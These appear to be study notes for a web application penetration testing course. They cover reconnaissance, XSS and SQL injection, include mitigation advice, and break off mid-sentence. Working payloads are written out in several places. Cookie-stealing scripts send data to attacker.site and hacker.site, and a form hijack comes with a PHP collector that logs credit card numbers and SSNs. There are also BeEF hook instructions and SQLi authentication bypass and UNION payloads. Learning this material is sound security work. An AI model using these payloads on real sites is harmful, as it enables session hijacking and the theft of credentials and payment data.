Interaction     Detecting database interaction will allow us to look For SQL injection vulnerabilities in the testing phase.   By database interaction, we mean that the user input changes the appearance of the page because either different data is fetched from the database or, new data is added.   This hints that the SQL queries are generated from our input and if the input is not properly sanitatized, may result in SQL injections.   File Uploading and Downloading     Its not uncommon to encounter web pages providing dynamic downloads according to a parameter provided by the user.   example: www.example.com/download.php?file=document.pdf      This can lead to RFI and LFI vulnerabilities    Display of User Supplied Data     This is one of the most common features in a dynamic website   Will bring us to: XSS - Cross Site Scripting   Redirections     Redirections are server side or client side directives to automatically forward the visitor of a web page to another web page.   From the server side perspective the server can issue two different HTTP Response codes to make a redirect: 301 or 302.   Just remember: code 3xx stands For redirect   From the client perspective, the redirection is handled by the web browser. It recognizes the 3xx HTTP Response code and makes a request to the page contained in the Location header.   The meta HTML tags are used to add metadata information to a web page. This data is usually read by search engines to better index the web page.   Finding redirects is an important part of our attack surface as HTTP response splitting and other Header manipulation attacks can be performed when redirects are not handled properly.   Access Controls and Login Protected Pages     Logins pages will reveal the presence of restricted access areas of the site.   We will employ authentication bypass techniques as well as password brute forcing to test the security of the authentication routines in place.   Error Messages     We will collect all the errors we may encounter while browsing it.   Charting     We must keep all our information well organized.   This will let us spot the attack surface and perform our test in a much easier and scientific manner        We advise to add the information found For each block visually.       During the procces of mapping the attack surface, we have introduced two alternative charting techniques:   tree-based = its good if there are just a few blocks.   table-based = We can use in our testing phase, where a test For given vulnerability will be triggered by a V in the table.   Enumerating Resources     In this step:   subdomains website structure hidden files configuration files any additional information leaked because of misconfiguration   Crawling The Website     Crawling a website is the process of browsing a website in a methodical or automated manner to enumerate all the resources encountered along the way.   A crawler finds files and folders on a website because these appear in web page links, comments or forms.   We can use Burp:   Target tab &gt; Scope subtab to set up our scope   set the proxy   Spider tab &gt; spider is running    go to the website   right-click on the host and click spider this host or enable the spider and start browsing the web app from our browser   By right-click on any crawled web page, we will be able to send it to the Intruder to fuzz it, or to Repeater - to manually alter the request in our tests.   Finding Hidden Files     These files are the most importante source of information we can find and include: backup files, configuration files and a number of other resources that are very useful For our audit.   DirBuster is a mature OWASP project that allows us to crawl a website and also mount a dictionary or brute force discovery attack on the remote file system by probing each call and identifying a correct guess through the HTTP response code or web page content (in case the website used a custom 404 page.)   We need to pay particular attention to files and folders that were not retrieved by Burp Proxy Spider.   Back Up and Source Code FIle     Looking For backup files and source code files left on a server in an often-overlooked step in the information gathering process that we will take seriously as it can give us not only useful information but also, sometimes, complete access to the organizations assets.   A web server is instructed to treat special file extentions as cgi files, where the source code is interpreted and not relayed to the client.   When the extention is altered For backup or maintenance purposes, we are often given the application logic and if we are lucky enough, credentials to access the databases connected to that application.   such common, disgraced practices, involve renaming the extension in php.bak or asp.bak For example.        Append common backup extensions like .bak, _bak or 01 etc, in the burp For every file found by our crawlers.       list of backup files extensions:   bak bac old 000 ~ 01 001 _bak inc // stands For include, check their presence especially when the site uses ASP as the server-side script Xxx   Enumerating Users Accounts     A badly designed system can reveal sensitive information even if wrong credentials have been inserted.   A web application could reveal information about the existence of a user.   While determining valid usernames is something not considered as a serious threat, usernames are half of what is needed to login.   Applications may reveal too much information, that can make an intruders life easier by making it possible to enumerate the users.   Relevant Information Through Misconfigurations     A quick and very common way to gather information, files, source code and misconfigurations is by looking For open directory listings.   Directory Listing     Starting with the DIrBuster output, which has uncovered a number of public and hidden directories on the server, let us do a GET request For each directory found. We will look at the web page content to search For patterns like To parent directory, Directory Listing For, index of …   If the pattern is matched, we should be in front of a directory listing that we can navigate to using our web browser.   Log and Configuration Files     Logs are text files left on the web server by applications to keep track of different activities: errors, logins, informative message and so on.   They usually contain valuable information that we will want to uncover.   every web app has a configuration file placed somewhere.   example: joomla stores the config file in the application root folder with the name configuration.php   Configuration files, contain settings and preferences regarding the web applications installed.   They can contain the username and password that the application used to connect to the database, or other administrative area.   This file in itself is not viewable because it has the .php extension, but we should look For backup alternatives: configuration.php.bak, configuration.php.old, etc   HTTP Verbs and File Upload     Among the different mistakes an administrator can make in the configuration of the web server, leaving a directory writable by anyone is the biggest.   Writable directories are all those directories that allow us to upload our own files on the server through the PUT HTTP verb.   Check the availability of the PUT verb among the allowed verbs.   To do this we will use Putty or Netcat to query the webserver directly issuing the following request:  OPTIONS / HTTP/1.1 Host: target.com  // the server will respond with the list of the available verbs // usually you will find out that only: GET, POST, HEAD and TRACE verbs are enabled. // Another thing, if the OPTIONS verb is not allowed, we will not be able to enumerate all the available verbs. This does not mean that PUT is not available. We will just have to test it directly. // In case OPTIONS verb is not allowed we will receive either a 4xx or 5xx error message according to the webserver.      We need to know what directory, if any, we can upload to.   Its important to understand the correlation between the directory privileges and the possibility of uploading files.   in IIS, every configured website can be run by different local users. These users are assigned to the website visitor in order For him to browse the website.        There is not a straight forward method how to verify directory privileges remotely.       Once we have a pool of candidate folders we will try our PUT command on them:   PUT /writable_dir/test.html HTTP/1.1 Content-length: 184 //its important to provide the content length of the payload &lt;RETURN&gt;      if the upload is successful, the server will respond with a 201 Created.    Google Hacking     Use google search operators For our information gathering purposes.   https://www.exploit-db.com/google-hacking-database/   example:   - Querying For Apache online documentation intitle:\"Apache HTTP Server\" intitle:\"documentation\" intitle:\"Apache HTTP Server\" intitle:\"documentation\" site:target.com  - Looking For open directory listings containing .bak files: \"Index of\" bak \"Directory listing for\" bak  - Looking For files with a specific extension is as easy as: filetype:\"bak\" filetype:\"inc\" filetype:\"inc\" site:target.com   Through Google Hacking, we may able to detect:  Error messages that may contain valuable information Sensitive Files and Directories // passwords, usernames, configuration, etc Server or application vulnerabilities Pages that contain login portals   Moreover:     http://www.googleguide.com/advanced_operators.html   https://www.exploit-db.com/google-hacking-database/   Shodan HQ     Similar to Google Hacking, there is another great search engine that will be very useful For our information gathering process.   http://www.shodanhq.com/help/filters   Instead of crawling data in web pages, Shodan scans the entire Internet and interrogates ports in order to gather information from the banners.   Shodan searches includes the following protocols:   HTTP(s) SSH SNMP MySQL/MondoDB RDP FTP Telnet // and few more   We can use it to search For:  Devices with default username and password, Viewing the configuration of a device, Detect server versions, and much more   Filters:  [before/after] day/month/year: search only For data that was collected before or after the given date hostname: filters results For hosts that contain the value in their hostname port: narrow the search For specific services OS: search For specific operating system      [+] Practice: Find all the devices running apache in Italy (IT) apache country:IT    XSS - Cross Site Scripting   Intro      Attacks triggered by user input are called input validation attacks.   Whats an input validation attack?           Its when malicious input tries to subvert the anticipated function of an application because of either insufficient validation by the application or by the server, before it uses the data.       Most web application vulnerabilities are the result of poor coding design and ignorance of the best practices of secure coding methodologies.   We will see some common mitigation techniques while studying each vulnerability.   Input validation attacks include XSS, SQL injections, HTTP Header tampering and many others.   We will have a look at each of them as all of them have their unique discovery and exploitation techniques.   Cross Site Scripting     The ultimate purpose is to inject HTML (HTML injection) or run code (JavaScript) in a users web browser.   XSS is considered an attack against the user of a vulnerable website.   &lt;?php echo '&lt;h4&gt;Hello ' . &lt;?php $name = @$_GET['name']; ?&gt; . '&lt;/h4&gt;'; ?&gt;      it will print a welcome message to the user whose name is retrieved from the $_GET variable.        the $_GET stores the &lt;parameter,value&gt; pairs passed through the HTTP GET method.       GET is the method used when clicking links or directly typing the website URL you want to browse, into your browsers location bar.   The user input will be extracted from the querystring of the URL browsed   → http://victim.com/welcome.php?name=MyName      When the above is passed to the server, the $_GET variable will contain a name parameter with the value MyName. ?name=MyName is called querystring.   The following HTML code will be returned from the server to the web browser:   &lt;h4&gt;Hello MyName&lt;/h4&gt;      Our input is part of the output web page source code.   We can insert a malicious payload in there:   ?name=&lt;/h4&gt;&lt;script&gt;alert('This is XSS');&lt;/script&gt;   // It injects some JavaScript code into the web page source code. // The JS will be executed within the website context of the browser.   Why does this happen?      Because the user input is given as output, without any kind of sanitization (either on input or output).    Anatomy of an XSS Exploitation  Goals:     Cookie stealing   Getting complete control over a browser   Initiating an exploitation phase against browser plugins first and then the machine   Perform keylogging   1 step: Try to find an XSS vulnerability affecting the website   2 step:   Once a XSS exploit is located, i will have to:     build a payload   create a link   send it to the victim inviting the same to click on it   (this is called a Reflected XSS that we will see in much more details in the next paragraphs)   &lt;img src=\"http://auth.y.com/vuln.php?&lt;XSS payload&gt;\"&gt;      The image tag above may be inserted in a third-party website (perhaps a forum or a social network that the victim may trust) The final goal is to have his victims browser to visit the crafted link (carrying the payload), so he will use any trick at his disposal.    The 3 Types of XSS     Reflect XSS   Stored XSS   DOM XSS   Reflected XSS     Is the most common and well understood form of XSS vulnerabilties.   It occurs when untrusted user data is sent to a web application and is immediately echoed back as untrusted content.   Then, as usual, the browser receives the code from the web server response and renders it.   This type of vuln deals with the server-side code.   &lt;?php $name = @$_GET['name']; ?&gt; Welcome &lt;?=$name?&gt;   Persistent ( aka Stored) XSS     similar to Reflected however, rather than the malicious input is being directly reflected in the response, its stored within the web application.   Once this occurs, its then echoed somewhere else within the web application and may be available to all visitors.   Occurs within server-side code but, between the two, this is the most useful one For an attacker.   The reason is simple. With a page persistently affected, we are not bound by having to trick a user. We just exploit the website and then any visitor that visits will run the malicious code and be affected.   DOM XSS     Exists only within client-side code *typically JavaScript   Generally speaking, this vulnerability lives within the DOM environment, thus within a pages client-side script itself and does not reach server-side code.   Similar to Reflected XSS example, but without interacting with the server-side. A web application can echo the welcome message in a different way as you will be able to see in the following sample code:   The key to exploiting this type of XSS flaw is that the client-side script code can access the browsers DOM elements thus all the information available in it. Examples: URL, history, cookies, local storage, etc   Despite this, DOM is a jungle, and finding this type of XSS is not the easiest task.   Going Deeper   Reflected XSS (aka Non-persistent)     Victims bring the payload in their HTTP request to the vulnerable website. This payload will be inserted into the webpage and executed by their browsers.   The hacker has to trick the victim into starting a specially crafted request to the vuln website page in order For the attack to be successful.   The hacker has many techniques at his disposal to camouflage the offending url:  tinyurl and similar services : http://tinyurl.com/ iframes located in a third-party malicious webpage link in a targeted email and so on.      Most of the time, reflected XSS are used by hackers to steal sessions IDs (stored in cookies) or the cookies themselves. More advanced reflected XSS can be used For phishing techniques, XSS worms or to install malware on victims machine through the exploitation of web browser vulnerabilties.   Persistent XSS     Are attacks that lead to the execution of code in all the users web browsers visiting a vulnerable (and exploited) web page.   The inject code is saved by the application, unsanitized and then rendered on either the same, or another web page in the same web site.   The malicious code can be injected, by the attacker, directly into the web application   This is the most important difference between Reflected and Persistent XSS.   This is the most dangerous form of XSS, as it can target all the visitors of a website, and its the only form of XSS actually targeting the website itself (not only its visitors)   such attack is very destructive and likely to occur in:  Community Content driven Custom applications like blogs Commeting systems and social networks           During a reflected XSS attack:       The user could defend himself at some extent relying upon his experience and security awareness            However, In this case (Persistent Attack):       The attack is so covert and neat, that as soon as the user browses the infected page, the code is automatically executed.       DOM (Document Object ModeL)     Its an object built by the web browser upon parsing the web page content provided by the server.   Functions like getElementByTagName are DOM functions that let us navigate through the page elements in a hierarchical view (a node may have children as well as a father and may contain attributes and so on)   They are allowed when the JavaScript code uses the user supplied data as part of its logic.   Once again, if sanitization is not put in place, injection is possible.   JavaScript code can use the querystring provided to the webpage as input to perform different operations accordingly.   Another way to gather user input is to use the prompt() method.   When the user input is part of the querystring and is used as output through either the function document.write or, its variants, its possible to inject arbitrary content into the web page.   This attack does not require any interaction with the server.   moreover: http://www.webappsec.org/projects/articles/071105.shtml   DOM-based XSS can even be persistent. If the malicious payload is saved by the web application within a cookie, the victim user, providing the server with the poisoned cookie, will run the malicious payload every time a new request is sent to test.html.   Finding XSS     If there is a correlation between both output-input and the user supplied data is part of the output, then we have found a potential mount point For an XSS attack.   Once we have spotted these output &lt;=&gt; input correlations, we will try to inject either HTML or JavaScript code into the input. When we say Input we mean one of the following:   GET/POST variables COOKIE variables HTTP headers      So you should be capable of understanding what channels the application uses to retrieve data from the user.   The channel used by the web app may change the level of exploitability:   Input from the GET method is the easiest to exploit.     By including a payload in a crafted link, when the victim clicks on this link, they are executing an example of XSS (carried in the GET method of the HTTP request),   The POST verb:     IS used For forms submission therefore, exploiting it requires both some tricks and a different exploitation approach.   How to test   At first just: &lt;plaintext&gt;       This special HTML tag instructs the browser to treat the remaining web page source as plain text thus, breaking the appearance of the site.   You can immediately tell if the inject was successful without inspecting the source; you will just see a broken web page layout showing the web page source as part of the website appearance.   However, Injecting plaintext tag is not indicative of the possibility of injecting scripts.   This is why the second step would be to check using script tag or using one of the DOM events.   Sometimes, the input validation routines may allow the plaintext tag, but may deny tags like IFRAME or IMG.   Finding XSS in PHP Code     A general rule For this kind of (iterative and complex) task is to look For all the points where the application outputs data (totally or partially) supplied by the user and tracking it back to the source where it is retrieved For the first time:   If a sanitization or integer conversion is made then you should be fine (as long as the sanitization is properly implemented).   In this process, one should also take in to consideration data that comes from the database. This data may not have been sanitized and as a result, can result in a persistent XSS mount point.   This endeavor is time consuming, so the use of cross referencing tools like PHP XREF For PHP language projects is highly recommended.   It will help you with the tracking of variables life from declaration to their death on output.   XSS Exploitation    Example: &lt;html&gt; &lt;head&gt;&lt;title&gt;Test XSS &lt;/title&gt;&lt;/head&gt; \t&lt;body&gt; \t\t&lt;img src=\"logo.png\" alt=\"&lt;?= $_GET['name'] ?&gt;\"&gt; \t&lt;/body&gt; &lt;/html&gt;       If you want to practice with it, you can just create a PHP file with the above code. Setup a web server with PHP using Wamp For Windows and Lamp For Linux.     \"&gt;&lt;script&gt;alert('XSS Example')&lt;/script&gt; \"&gt;&lt;body onload=\"alert('XSS Example') \"\"&gt;&lt;body onload=\"alert('XSS Example')\"&gt; \" onload=\"javascript:alert('XSS Example') index.php?name=\" onload=\"javascript:alert('XSS Example')       The DOM events are often used in XSS exploitation because they allow us to avoid using suspicious characters like    &lt; &gt;     We do not even need to use any HTML tags (like the SCRIPT or BODY tags) here. Therefore, we are able to bypass basic input validations routines that may rely on this type of silly check.      If filters and input validation routines are in place, then we wil want to ensure to submit as few suspicious characters as possible.   In this case the javascript: in the onload event of our payload can be ommited to become:  index.php?name=\" onload=\"alert('XSS Example')   Making our script injection elegant and hard to detect, we can avoid using single quotes with the help of the JavaScript function String.fromCharCode. This will output a character by its code and the payload would become:  \" onload=\"alert(String.fromCharCode(88,83,83))   XSS and Browsers     XSS is the injection of scripts and HTML in web pages source code.   They way we do this injection, is sometimes tricky and involves quite a bit of knowledge of the technologies involved.   Basically, it should be understood that a payload working under Firefox may not work For Internet Explorer or Safari and vice versa.   Browsers are software that interpret the HTML received by the web server according to their internal rules.   Just like how you would do your best to code your website to be cross-browser compatible, the same must be said For XSS exploits.   Even if these filters can block simple common XSS vectors, they cannot find every XSS because, it really depend on the injection point.   XSS Attacks  Potential objectives a hacker can achieve by successfully exploiting an XSS vulnerability discovered in a web site.     Cookie stealing   Defacement   Phishing / Malware   XSS Worms   Attack - Cookie Stealing Through XSS     Cookies carry parameters from an HTTP server to its clients and vice-versa.   The SOP prevents cookie stealing however, we can violate it by means of an XSS attack.   If we steal the sessionID and install the cookie with this sessionID on our browser, we are able to access bob account on alice.xxx   The purpose of the following XSS attack is to steal that cookie   Once again: Cookies can be read only through JavaScript embedded in alice.xxx (and only if httpOnly is not set For that cookie)        The same-origin policy forces us to cross the security boundaries of websites through an XSS that we have to find within alice.xxx       The first part of the attack is the research of a XSS in alice.xxx Example:   domain=.alice.xxx        this means that we can search in subdomain aswell, think of it as *.alice.xxx       The other parameter to consider is the path.   When a cookie is issued with the parameter path=/ its valid For all the directories of the domain it applies.   Path can limit the validity of the cookie to a specific subdirectory, shrinking the possibilties of finding an XSS.   Example:  path=/members/ - Our research For XSS will be limited to **members** directory and its subdirectories: /members/* path=/members      Without the trailing slash the wildcard becomes /members*.       The web browser enforces the same-origin policy on the hostname-port. The cookie path has nothing to do with security. We still have access to the DOM!   So its possible For an application in path2 to read cookies in path1 by using the following trick: put this in a html file within /path2/    &lt;script&gt; function cookiepath (path) { \tFor (var i = 0; i &lt; window.frames.length; i++) { \t\tframeURL = window.frames[i].location.toString(); \t\tif (frameURL.indexOf(path) &gt; -1) \t\t\talert(window.frames[i].document.cookie); \t\t} \t} &lt;/script&gt; &lt;iframe onload=\" cookiepath('/path1/')\" style=\"display:none;\"  src=\"/path1/index.php\"&gt;&lt;/iframe&gt;       Basically a script in a page under /path1/ is capable of reading the cookie set For /path2/ through an iframe.   This means that if you need an XSS in /path2/ you may still look For it in other paths provided that you are able to inject the above code exploit.   Firefox extensions          To test how the cookies mechanism works: Live HTTP Header - https://addons.mozilla.org/en-US/firefox/addon/3829 // Helps understanding when the cookie is being sent Cookie Editor - https://addons.mozilla.org/en-US/firefox/addon/4510 // show the installed cookies and the &lt;domain, path, expiration&gt; parameters       The flag httpOnly prevents cookies from being read by JavaScript   secure cookies - are sent only if https (SSL) is used in the request        Search pages are good places to look For XSS       The exploitation process goes as follows:            Read the cookie using JavaScript       Redirect the cookie content to a server that we own (lets suppose test.com)       Retrieve the logged cookie from our server and install it on our browser using A&amp;C Cookie editor or any other means (This third step may vary according to the browser used)           Payload   → search.php?kw=   // the %2b is the URL-encoded version of the + character // the browser cannot tell if the src attribute of an image object is real image or not, so it must perform a GET request to the attacker-supplied PHP script   steal.php content:  $fn=\"log.txt\"; $fh=fopen($fn, 'a'); $cookie=$_GET['q']; fwrite($fh,$cookie); fclose($fh);      We could send this to bob by email, if bob is a privileged user on alice.xxx and if the rules of engagement allow this, then we can also take advantage of URL shrinking service like tunyurl.com that hides the payload For us.   Whose fault is it?     The actual victim (bob) is not vulnerable to any direct attack   And the vulnerable party (alice) is not the victim   In this case, the vulnerable site positions its visitors and their data at risk   There is little left For them to do to protect themselves beside using Noscript add-on on Firefox or relying on XSS filters.   Attack - Defacement     The most immediately visible damages that an XSS may cause   When we find a persistent XSS, we are able to change the appearance of the web page by manipulating the DOM.   document.body.innerHTML=\"&lt;h1&gt;Defaced&lt;/h1&gt;\";      The DOM object body corresponds to the BODY tag that holds the page content        By setting its content, we basically replace the current content with our own. In this case is just the word Defaced.       All of us know phishing by the many spam emails we receive everyday asking For our PayPal login credentials.   This and many others are the ways a phisher wants us to visit a crafted website convincing us of its authenticity   These phishing attacks resolve around deceiving the user into thinking that one website, is a different one.   XSS phishing on the other hand, modifies the actual website in a sneaky way to increase the chances of success.   If the phisher objective is to steal login credentials and an XSS if found on the login page of a website, the only change to make would be to the login FORM. The attacker would make sure that the username and password would be redirected to a domain belonging to him.      Note: SSL certs, DNS checks, blacklists, and other phishing defenses fail miserably in handling XSS phishing because the phishing website is the actual website.    How to     The simpliest way is to alter the ACTION parameter of the FORM tag:   &lt;form name=\"loginform\" method=\"POST\" action=\"/checklogin.cgi\"&gt;      By injecting the following JavaScript the page will remain unchanged.   document.forms[0].action=\"https://hacker.site/steal.php\";   Attack - BeEF     Once an XSS vuln is found. BeEF is the fastest way to exploit it and gain control of the remote browser.   If the browser is unpatched or old, BeEF and Metasploit Browser Autopwn are capable of exploiting it to give you a remote shell on the remote machine.   Mitigation     XSS exploits are Data Validation vulnerabilties   XSS vulns can happen only if untrusted user input is used on the web application output.   This kind of vulnerability is actually an output encoding vuln: XSS exploitation happens when the attacker manages to inject code on the output   Mitigating a XSS is about implementing two layers:  Input Validation to filter the attack vectors as much as possible Context-Aware output encoding to correctly and safely render users content on the web application pages   Input validation     The characters needed to represent the input data should be the only ones accepted   Example:  The quantity field of an online shopping cart should accept only digits. The developer could implement a whitelist that will accept only numbers.   Context-Aware Output Encoding     Every time input supplied by the user is displayed in the web application output, it should be encoded. The encoding engine must know where in the web application output the untrusted input will be rendered.   Example:   An online forum could accept some tags like &lt;spoiler&gt;The assassin was...  &lt;/spoiler&gt; but it really should not accept something like &lt;script&gt;!      Rendering URL paths requires a different encoding system than rendering special characters. This is different from encoding in JavaScript code.   Because of this, we usually suggest that clients implement XSS filtering by using a vetted library or a platform function      [!Caution] Writing a custom anti-XSS library will very likely be prone to implementation mistakes.       When builting web applications: Never trust user input!    Reflected/Stored XSS   Check if input fields are sanitized:  &lt;h1&gt;Hi &lt;h1&gt;   Verify if JavaScript code works:  &lt;script&gt;alert('xss');&lt;/script&gt;   Try to print out the cookie:  &lt;script&gt;alert(document.cookie);&lt;/script&gt;      Trick the user with this code    get.php:   &lt;?php  $ip = $_SERVER['REMOTE_ADDR']; $browser = $_SERVER['HTTP_USER_AGENT']; $fp = fopen('jar.txt', 'a'); fwrite($fp, $ip.' '.$browser.\" \\n\"); fwrite($fp, urldecode($_SERVER['QUERY_STRING']). \" \\n\\n\"); fclose($fp); ?&gt;   Crafted a Payload:  &lt;script&gt; var i = new Image(); i.src=\"http://attacker.site/get.php?cookie=\"+escape(document.cookie)&lt;/script&gt;      So, each time the user loads this page, his cookies will be sent to our script and we will be able to read them.       Just copy the stolen cookie to our browser and we can login with the user credentials   DOM XSS  \"&gt;&lt;img src=\"aaa\" onerror=\"alert(document.domain)\"&gt;              \"&gt;&lt;svg/onload=\"alert(document.domain)\"&gt;             Go to web console in the browser:  document.forms document.forms[0] document.forms[1] document.forms[1].action=\"test.html\"   // we changed the result of the click button to a page that does not exist // now we can point to a page that we own    \"&gt;&lt;svg/onload=\"document.forms[1].action='//hacker.site/steal.php'\"&gt;             \"   steal.php:   &lt;?php if (isset($_POST['cc'])) { \t$LOOT=\"loot.txt\"; \t$ccData=$_POST['cc'] . '|||' . $_POST['ssn'] . \"\\n\"; \t$fh = fopen($LOOT, 'a'); \tfwrite($fh, $ccData); \tfclose($fh); \techo \"Thanks for your credit card information\" . $_POST['name'] . \"!!!\"; } ?&gt;    JS   alert.js:  alert('This is hosted on hacker.site')   Browser console:  var s = document.createElement('SCRIPT'); s.src = '//hacker.site/alert.js'; document.body.appendChild(s);      now we copy the 3 lines to a onload script in the URL browser   \"&gt;&lt;svg/onload=\"var s = document.createElement('SCRIPT');s.src = '//hacker.site/alert.js';document.body.appendChild(s);\"&gt;         \"      It can bypass browsers like chrome that has a anti-XSS system.  Cause DOM attack is executed in the client-side    beEF Attack  in Kali:  cd /etc/beef-xss/ nano config.yaml take the '#' of the permitted_ui_subnet take the '#' of the permitted_hooking_subnet change the listening port to '80' or '443' set user and password For the interface if u want      Kali Linux &gt; System Services &gt; BeEF &gt; beef start   or   cd /usr/share/beef-xss ./beef copy the UI URL to the browser   Go to a vulnerable site and inject the hook.js from the beef:   &lt;script src=\"http://&lt;kali ip&gt;:80/hook.js\"&gt;&lt;/script&gt;      the website is hooked, now anyone that access this site, will be hooked too and we can access via beef browser      Enjoy all the option beef provides    ./beef -x  // to open a completly new session   SQL Injection   Introduction to SQL Injections (SQLi)     it exploits the injection of SQL commands into the SQL queries of a web app.        A successful SQLi attack lets a hacker access and manipulate a web app backend database.       To interact with databases, entities such as system operators, programmers, applications and web applications use Structured Query Language (SQL)   Web app embed SQL commands, also known as queries, in their server side code.   The code takes care of establishing and keeping the connection to the database by using connectors. Connectors are middle-ware between the web app and the database,   SQL basics:  SQL statements syntax How to perform a query How to union the results of two queries The DISTINCT and ALL operators How comments work   SQL Statement  SELECT name, description FROM products WHERE id=9;   // The above code queries the database, asking For the name and the description of a record in the products table. In this example, the selected record will have id value equal 9   SELECT &lt;columns list&gt; FROM &lt;table&gt; WHERE &lt;condition&gt;;  // moreover http://www.w3schools.com/sql/sql_intro.asp   Its also possible to select constant values:  SELECT 22, 'string', 0x12, 'another string';   UNION command, performs a union between two results:  &lt;SELECT statement&gt; UNION &lt;other SELECT statement&gt;;   f a table or query contains duplicate rows, you can use the DISTINCT operator to filter out duplicate entities:  SELECT DISTINCT &lt;field list&gt; &lt;remainder of the statement&gt;;   A UNION statement implies DISTINCT by default. You can prevent that by using the ALL operator:  &lt;SELECT statement&gt; UNION ALL &lt;other SELECT statement&gt;;   Comments: There are two strings you can use to comment a line in SQL:  # (The hash symbol) -- (two dashes followed by a space)   Example:  SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;   SQL Queries Inside Web Applications     To perform the same tasks from within a web app, the app must:   Connect to the database;   Submit the query to the database;   Retrieve the results;   The previous example shows a static query example inside a PHP page:  $connection is an object referencing the connection to the database $query contains the query mysqli_query() is a function which submits the query to the database Finally the custom display_results() function renders the data      However, most of the times queries are not static, they are dynamically built by using the users inputs. Here you can find a vulnerable dynamic query example:    $id = $_GET['id']; $connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); $query = \"SELECT Name, Description FROM Products ID='$id';\"; $results = mysqli_query($connection, $query); display_results($results);      Although the code is functionally correct, this behavior is very dangerous, because a malicious user can exploit the query construction to take control of the database interaction.    Vulnerable Dynamic Queries  SELECT Name, Description FROM Products WHERE ID='$id';   What if an attacker crafts a $id value which can actually change the query?  ' or 'a'='a result: SELECT Name, Description FROM Products WHERE ID='' or 'a'='a';   // This tells the database to select the items by checking two condictions:  The id must be empty (id='') OR an always true condiction ('a'='a')   An attacker could also exploit the UNION command by supplying:  ' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a   How Dangerous is a SQL Injection     First, we have to understand that based on the DMBS that the web application is using (MySQL, SQL Server …), the attacker is capable of performing a number of actions that go much further than the mere manipulation of the database.   The attacker could read the file system, run OS commands, install shells, access the remote network and basically own the whole infrastructure.   Among all the vulnerabilities that may affect web applications, SQL injections are the first checked by hackers because of the fact that they produce the most immediate results.   SQLi Attack Classification  There is different types of classifications, each one based on different aspects such as:  Scope of the attack Exploitation vector Source of the attack   We will refer to 3 different injection attacks and exploitation types:  \tIn-band \tError-based \tBlind SQL      These classifications are based on the exploitatoin method used to carry out the attack.  This will help you follow the explanations of the detection and exploitation phases.    In-band SQL Injections     It leverage the same channel used to inject the SQL code   During and an in-band attack the penetration tester finds a way to ask the web app For the desired information.   Error-based SQL Injections     During a Error-based the pentest tries to force the DMBS to output an error message and then used that information to perform data exfiltration.   The pentest needs to use advanced DBMS features. Errors could be sent either via the web application output or by other means such us automated reports or warning emails.   Blind SQL Injection     A web app vulnerable to blind SQL injection does not reflect the results of the injection on the output. In this case the pentest must find an inference method to exploit the vulnerability.   Inference exploitation is usually carried out by using true/false conditions   The pentest can understand if a condition is true or false by studying the web app behavior.   Finding SQL Injections     The most direct way to find SQL injections within a web app is to probe its inputs with characters that are known to cause the SQL query to be syntactically invalid and thus forcing the web application to return an error.   Note: Not all the inputs of a web app are used to build SQL queries. In the Information Gathering module, we suggested that you categorize the different input parameters and save the ones used For database retrieval and manipulation.        Input parameters are carried through: GET and POST requests, HEADERS and COOKIES. We have to check all these channels where data is retrieved from the client.       Testing input For SQL injection means trying to inject:   String terminators: ' ' and \" \" SQL commands: SELECT, UNION and others SQL comments: # or --      And checking if the web app starts to behave oddly   Always test one injection at a time. Otherwise you will not be able to understand what injection vector is successfull.   SQL Errors in Web App     Every DBMS responds to incorrect SQL queries with different error messages.        Even within the same DBMS, error messages change according to the specific function the web app uses to interact with it.       A typical error from MS-SQL:   Incorrect syntax near [query snippet]   A typical error from MySQL:  You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version For the right syntax to use near [query snippet]      If, during an engagement, you find errors similar to the previous ones, its very likely that the application is vulnerable to an SQL injection attack.   This is not always the case, sometimes you have to have educated guesses in order to understand if a web app is vulnerable or not.   Boolean Based Detection     This happens both because of the usability of the application, its useless to display errors to end users who cannot understand or fix them, and to achieve security through obscurity.   Security through obscurity is the use of secrecy of design, implementation or configuration in order to provide security. In the following slides you will see how this approach cannot defend a vulnerable application from SQL injection attacks.   If a web app does not display errors in its output, its still possible to test For SQL injection by using a Boolean based detection technique.   The idea behind is simple, yet clever: Trying to craft payloads which transform the web app queries into True/False conditions. The penetration tester then can infer the results of the queries by looking at how the application behavior changes with different True/False conditions.   Example:  1141' and 'els'='els       After detecting a potential injection point, its time to test if its actually exploitable.   In the following chapters, you will see different techniques to exploit SQL injection vulnerabilities.   Exploiting In-Band SQL Injections     In-band SQL injection techniques make the retrieval of data from the database very powerful thanks to the use of the UNION SQL command. For this reason, In-band injections are also known as UNION-based SQL injections.   This kind of attack lets a pentester extract the database content, in the form of the database name, tables schemas and actual data.   There are many things to note in the previous attack:  The field types of the second SELECT statement should match the ones in the first statement; The number of fields in the second SELECT statement should match the number of the fields in the first statements; To successfully perform the attack, we need to know the structure of the database in terms of tables and column names.   Enumerating the Number of Fields in a Query  Enumerate the number of columns or fields, in query selects:  mysql_query(\"SELECT id, real_name FROM users WHERE id=\".$GET['id'].\";\");   // id has data type int // real_name has data type varchar (a string)   If the web app outputs an error, please note that every DBMS outputs a different error string:     MySQL error: The used SELECT statements have a different number of columns   MS SQL error: All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.   PostgreSQL error: ERROR: each UNION query must have the same number of columns        Oracle error: ORA-01789: query block has incorrect number of result columns       We start by injecting a query that selects null fields. We start with a single field and then increase the number of fields until we build a valid query.   Example: Detecting the number of fields needed to exploit an in-band SQL injection looks like the following:  9999 UNION SELECT NULL; -- - 9999 UNION SELECT NULL, NULL; -- - 9999 UNION SELECT NULL, NULL, NULL; -- - 9999 UNION SELECT NULL, NULL, NULL, NULL; -- -      We can iteratively add null fields until the error disappears.   This will force the web app to execute the following queries:  SELECT id, real_name FROM users WHERE id='9999' UNION SELECT NULL; -- - SELECT id, real_name FROM users WHERE id='9999' UNION SELECT NULL, NULL; -- -   Blind Enumeration     What about a web app that does not display errors?   The basic idea is similar (increasing the number of fields at every step) but, in this case we want to start with a valid id and then inject our query.   As we did before, we increase the number of fields selected until we create a valid query.   Identifying Field Types     After identifying the number of fields, we need to find their type. Most of the DBMS perform type enforcing on the queries.        If the DBMS performs type enforcing on UNION statements you cannot perform a UNION between an integer and a string therefore &gt;  SELECT 1 UNION ‘a’; will trigger an error!       Depending on how the DBMS handles data types, we are required to provide an exact match of the data types For each column in the two SELECT statements.                  DBMS       Type Enforcing                 MySQL       No                 MSSQL Server       yes                 Oracle       Yes                 PostgreSQL       yes           Finding the data types used in queries is, once again, a cyclical 